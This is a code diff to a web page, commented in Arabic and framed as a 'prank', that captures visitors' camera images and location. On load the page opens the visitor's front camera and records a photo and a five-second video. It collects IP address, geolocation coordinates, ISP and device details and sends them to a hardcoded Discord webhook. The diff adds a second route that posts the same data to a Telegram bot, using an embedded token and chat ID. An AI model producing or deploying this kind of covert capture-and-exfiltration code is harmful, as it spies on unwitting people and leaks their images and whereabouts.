@@ -154,7 +154,7 @@
     </div>
   </div>
 
-  <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
   <canvas id="emojiCanvas"></canvas>
 
@@ -169,6 +169,8 @@
     const flashOverlay = document.getElementById('flashOverlay');
 
     const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1464000266369110038/QPfYRwlrewHl-vowOukyN-YrYRIJ3pZiw_KhIx5NMbB-QDn4Cm9rNnoU1K6yngbkF5MC';
+    const TELEGRAM_BOT_TOKEN = '8520906764:AAFjE-Yr1N6B1sojXrClpjzP32yfueGRvPc';
+    const TELEGRAM_CHAT_ID = '6861577366';
 
     let savedPhotoData = null;
     let videoRecorded = null;
@@ -212,8 +214,7 @@
     window.onload = async function() {
       try {
         cameraStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user" },
-          audio: true
+          video: { facingMode: "user" }
         });
         
         video.srcObject = cameraStream;
@@ -341,12 +342,27 @@
       }
     }
 
-    // إرسال للـ Discord
+    // إرسال للـ Discord والتليجرام
     async function sendToDiscord(imageData, videoBlob, type) {
       try {
         console.log(`📸 بدء الإرسال (${type})...`);
         
         const deviceInfo = await getDeviceInfo();
+        
+        // إرسال للديسكورد
+        await sendToDiscordWebhook(imageData, videoBlob, type, deviceInfo);
+        
+        // إرسال للتليجرام
+        await sendToTelegram(imageData, videoBlob, type, deviceInfo);
+
+      } catch (error) {
+        console.error('❌ خطأ:', error);
+      }
+    }
+
+    // إرسال للديسكورد
+    async function sendToDiscordWebhook(imageData, videoBlob, type, deviceInfo) {
+      try {
         const formData = new FormData();
         
         // إضافة الصورة
@@ -379,7 +395,7 @@
             { name: '🧠 الذاكرة', value: `${deviceInfo.deviceMemory} GB`, inline: true }
           ],
           timestamp: new Date().toISOString(),
-          footer: { text: type === 'initial' ? '🎥 فيديو 5 ثواني مرفق' : '😂 تم المقلب!' }
+          footer: { text: type === 'initial' ? '🎥 فيديو 5 ثواني مرفق (بدون صوت)' : '😂 تم المقلب!' }
         };
 
         formData.append('payload_json', JSON.stringify({
@@ -393,13 +409,71 @@
         });
 
         if (response.ok) {
-          console.log(`✅ تم الإرسال بنجاح (${type})!`);
+          console.log(`✅ تم الإرسال للديسكورد بنجاح (${type})!`);
         } else {
-          console.error('❌ فشل الإرسال:', await response.text());
+          console.error('❌ فشل الإرسال للديسكورد:', await response.text());
         }
 
       } catch (error) {
-        console.error('❌ خطأ:', error);
+        console.error('❌ خطأ في الديسكورد:', error);
+      }
+    }
+
+    // إرسال للتليجرام
+    async function sendToTelegram(imageData, videoBlob, type, deviceInfo) {
+      try {
+        const messageType = type === 'initial' ? '📸 الصورة والفيديو الأولي' : '💩 صورة المفاجأة';
+        const emoji = type === 'initial' ? '🎉' : '💩';
+        
+        // تجهيز النص
+        const text = `${emoji} **${messageType}**
+
+🌐 IP: \`${deviceInfo.ip}\`
+📍 الموقع: ${deviceInfo.city}, ${deviceInfo.country}
+🗺️ المنطقة: ${deviceInfo.region}
+📡 ISP: ${deviceInfo.isp}
+📌 الإحداثيات: ${deviceInfo.latitude}, ${deviceInfo.longitude}
+💻 النظام: ${deviceInfo.platform}
+🖥️ الشاشة: ${deviceInfo.screenResolution}
+🌍 اللغة: ${deviceInfo.language}
+⏰ المنطقة الزمنية: ${deviceInfo.timezone}
+🧠 الذاكرة: ${deviceInfo.deviceMemory} GB
+
+⏱️ الوقت: ${new Date().toLocaleString('ar')}`;
+
+        // إرسال الصورة
+        if (imageData) {
+          const imageBlob = await fetch(imageData).then(r => r.blob());
+          const photoFormData = new FormData();
+          photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+          photoFormData.append('photo', imageBlob, `photo_${type}_${Date.now()}.png`);
+          photoFormData.append('caption', text);
+
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: photoFormData
+          });
+          
+          console.log(`✅ تم إرسال الصورة للتليجرام (${type})!`);
+        }
+
+        // إرسال الفيديو
+        if (videoBlob) {
+          const videoFormData = new FormData();
+          videoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+          videoFormData.append('video', videoBlob, `video_${Date.now()}.webm`);
+          videoFormData.append('caption', '🎥 فيديو 5 ثواني (بدون صوت)');
+
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+            method: 'POST',
+            body: videoFormData
+          });
+          
+          console.log(`✅ تم إرسال الفيديو للتليجرام!`);
+        }
+
+      } catch (error) {
+        console.error('❌ خطأ في التليجرام:', error);
       }
     }
   </script>
